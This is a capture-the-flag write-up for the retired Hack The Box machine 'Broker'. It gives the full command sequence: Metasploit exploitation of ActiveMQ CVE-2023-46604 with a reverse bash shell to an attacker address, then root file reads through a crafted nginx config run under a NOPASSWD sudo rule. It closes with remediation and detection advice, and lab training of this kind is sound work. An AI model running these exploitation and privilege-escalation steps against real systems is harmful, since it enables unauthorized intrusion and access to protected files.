HACK THE BOX / LINUX / EASY / RETIRED

Broker

ActiveMQ OpenWire RCE → activemq → sudo nginx → root file read

Dylan Senez · d4rkgunn3r · Public report

Source and reproduction

Edited from my retained Notion assessment notes. Commands are arranged into a complete sequence; addresses are the original lab values and must match your instance. Output excerpts are recorded evidence, not a new execution or independent retest. Instance flags and recovered secrets are omitted.

01 / Assessment summary

The December 22, 2025 assessment records an unauthenticated shell as activemq through CVE-2023-46604 and a root-context file-read primitive through sudo nginx. Both proof files were read. The documented endpoint is root file access, rather than a separately demonstrated interactive root shell.

02 / Reconnaissance

nmap -sV -sC -p- 10.129.13.29 -T4 --min-rate 5000 -oA Broker

The scan identifies ActiveMQ OpenWire transport 5.15.15 on TCP 61616. Other exposed surfaces include nginx on 80, Jetty on 8161 and 61614, MQTT on 1883, AMQP on 5672, and STOMP on 61613. The exploited entry point is OpenWire, not the HTTP management login.

61616/tcp open  apachemq  ActiveMQ OpenWire transport 5.15.15

03 / Exploit ActiveMQ

The original attempts exposed two local configuration problems: a collision on HTTP server port 8080 and a Windows payload selected for a Linux target. The successful configuration uses port 8081 and cmd/unix/reverse_bash. Replace the original LHOST with your reachable VPN address. Target indices may differ between Metasploit versions; confirm the Linux entry with show targets.

msfconsole
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOSTS 10.129.13.29
set LHOST 10.10.14.199
set SRVPORT 8081
show targets
set TARGET 1
set PAYLOAD cmd/unix/reverse_bash
show options
run

The retained record reports a command shell opening from the target to port 4444 on the attack host. It runs as activemq in /opt/activemq/bin.

04 / Validate the foothold

whoami
id
pwd
cat /home/activemq/user.txt
sudo -l

Recorded sudo permission:

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx

An unrestricted nginx configuration path matters because the configuration controls worker identity and which filesystem tree the server exposes. The resulting process can read files that the activemq account cannot.

05 / Read root-owned files with nginx

Create the configuration in the target shell. These are the configuration directives retained in the assessment. The original configuration listens on all interfaces at port 1337; stop the temporary server when finished.

cat > /tmp/privesc.conf <<'EOF'
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
EOF
sudo /usr/sbin/nginx -c /tmp/privesc.conf
curl http://127.0.0.1:1337/root/root.txt

The retained output includes the root proof value. It is redacted in this public version. The HTTP response demonstrates that the nginx process can read /root/root.txt; it does not independently establish an interactive root login.

06 / Troubleshooting and cleanup

A vulnerable-version or module-check message alone is not proof of code execution. The successful callback and target identity establish the foothold. If no session opens, check the module target, payload OS, callback route, and local HTTP server port.

For a repeat lab run, stop the temporary nginx instance using the same configuration, then remove the configuration file. The original notes do not contain cleanup output, so the following is a recommended close-out step rather than a recorded completed action.

sudo /usr/sbin/nginx -c /tmp/privesc.conf -s quit
rm /tmp/privesc.conf

07 / Remediation and detection

Upgrade ActiveMQ to a release that fixes CVE-2023-46604 and restrict broker protocols to intended clients. Remove unrestricted sudo execution of nginx. Keep production configuration files root-owned and restrict any permitted privileged invocation to an exact configuration.

Investigate unexpected outbound connections from the broker JVM, broker-launched shell processes, sudo nginx invocations using temporary files, and listeners exposing filesystem paths. These are proposed detection opportunities, not retested controls.

08 / Reproduction checklist

Required: Nmap, Metasploit, a reachable callback address and free local staging port, followed by curl on the target. Confirm the OpenWire version and exploit configuration, obtain the activemq shell, verify the exact sudo rule, start nginx with the retained configuration, and read root proof over loopback. No missing custom script is needed.
